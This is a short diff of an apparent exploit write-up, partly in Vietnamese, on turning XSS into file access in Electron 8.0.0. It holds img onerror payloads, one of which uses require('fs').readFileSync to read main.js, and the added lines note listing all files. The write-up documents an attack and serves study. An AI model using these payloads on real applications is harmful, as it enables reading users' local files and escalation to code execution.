@@ -128,6 +128,10 @@ test <img src=x onerror=alert("XSS")>
 ```
 ![9](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/e0859aa1-ac5e-4189-ad9f-77f706a640d1)
 
+List hết các file ra 
+
+![image](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/47402d14-b248-4172-b3f9-8c6b8b6e5d0b)
+
 Đọc được cả file nếu muốn 
 ```
 <img src=x onerror=”alert(require(‘fs’).readFileSync(‘main.js’).toString());”>
